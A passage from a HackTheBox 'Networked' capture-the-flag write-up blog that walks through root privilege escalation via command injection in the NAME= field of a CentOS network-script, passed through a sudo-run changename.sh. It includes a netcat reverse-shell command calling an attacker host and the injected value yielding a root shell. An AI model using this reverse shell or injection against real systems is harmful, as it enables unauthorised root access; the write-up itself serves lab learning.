+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked tmp]$ ls -l /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">-rwxr-xr-x 1 root root 422 Jul  8 12:34 /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br></pre></td></tr></table></figure>
+
+<p>Without surprise we can not write in the file. Let’s investigate to check if we can find a flow in it’s working.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ cat /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE=guly0</span><br><span class="line">ONBOOT=no</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">    <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">while</span> [[ ! <span class="variable">$x</span> =~ <span class="variable">$regexp</span> ]]; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"wrong input, try again"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">        <span class="built_in">read</span> x</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$var</span>=<span class="variable">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/sbin/ifup guly0</span><br></pre></td></tr></table></figure>
+
+<p>The script take various user input to set them in a network configuration file <code>/etc/sysconfig/network-scripts/ifcfg-guly</code>. At the end the <code>/sbin/ifup guly0</code> apply the new configuration.</p>
+<h3 id="network-script-privilege-escalation"><a href="#network-script-privilege-escalation" class="headerlink" title="network-script privilege escalation"></a>network-script privilege escalation</h3><p>This one was new for me, while searching for informations about <code>network-script</code> I stumbled across this <code>SecList</code>:</p>
+<blockquote>
+<p>Redhat/CentOS root through network-scripts<br>If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can<br>adjust an existing one, then your system in pwned.<br>In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in<br>the name the system tries to execute the part after the white/blank space. Which means; everything after the first<br>blank space is executed as root.</p>
+<p>For example:</p>
+<p>/etc/sysconfig/network-scripts/ifcfg-1337</p>
+<p>NAME=Network /bin/id  &lt;= Note the blank space<br>ONBOOT=yes<br>DEVICE=eth0</p>
+<p>Yes, any script in that folder is executed by root because of the sourcing technique.</p>
+<p><a href="https://seclists.org/fulldisclosure/2019/Apr/24" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Apr/24</a></p>
+</blockquote>
+<p>Sounds exactly what we need since the <code>changename.sh</code> script edit the <code>NAME</code> value with user input string. And now I understand why the <code>Networked</code> name was chosen.</p>
+<p>Let’s give it a try. First we open a new listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">nc -e /bin/sh 10.10.10.10 8599</span><br><span class="line">wrong input, try again</span><br><span class="line">interface NAME:</span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
+
+<p>Alright, that couldn’t be that easy… The input is filtered. The rule is the following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br></pre></td></tr></table></figure>
+
+<p>This regex doesn’t seems that bad, we can still use <code>_</code>, spaces, <code>/</code> and <code>-</code>. To be honest at this point it gets really easy to overthink the solution which is quite simple in the end.</p>
+<p>Call to an external script should perfectly work:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ <span class="built_in">echo</span> <span class="string">"nc -e /bin/sh 10.10.10.10 8599"</span> &gt; /tmp/hg8</span><br><span class="line">[guly@networked]$ chmod +x /tmp/hg8</span><br><span class="line">[guly@networked tmp]$ sudo /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">/bin/bash /tmp/hg8</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">hg8</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">hg8</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">hg8</span><br></pre></td></tr></table></figure>
+
+<p>And bingo, a connection open on our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8599</span><br><span class="line">Listening on any address 8599</span><br><span class="line">Connection from 10.10.10.146:46502</span><br><span class="line">[root@networked ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@networked ~]<span class="comment"># cat /root.txt</span></span><br><span class="line">0a8ecxxxxxxxxxxxxxcb82</span><br></pre></td></tr></table></figure>
+
+<p>I had a lot of fun with this box and learned a few new things. I hope this writeup could help you too.</p>
+<p>As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/linux/">linux</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/command-injection/" rel="tag">command-injection</a>, <a class="tag-link" href="/tags/filtering/" rel="tag">filtering</a>, <a class="tag-link" href="/tags/gobuster/" rel="tag">gobuster</a>, <a class="tag-link" href="/tags/ifcfg/" rel="tag">ifcfg</a>, <a class="tag-link" href="/tags/networked/" rel="tag">networked</a>, <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/sudo/" rel="tag">sudo</a>, <a class="tag-link" href="/tags/upload/" rel="tag">upload</a>, <a class="tag-link" href="/tags/webshell/" rel="tag">webshell</a>, <a class="tag-link" href="/tags/weevely/" rel="tag">weevely</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-upload-vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">File upload vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-First-Check-MIME-Type"><span class="toc-number">1.2.1.</span> <span class="toc-text">Bypass First Check: MIME Type</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-Second-Check-File-extension"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass Second Check: File extension**</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-PHP-Webshell-gt-guly"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot PHP Webshell -&gt; guly</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#network-script-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">network-script privilege escalation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/networked/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/networked/&text=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/networked/&is_video=false&description=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Networked&body=Check out this article: https://hg8.sh/networked/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/networked/&name=HackTheBox - Networked&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/networked/&t=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
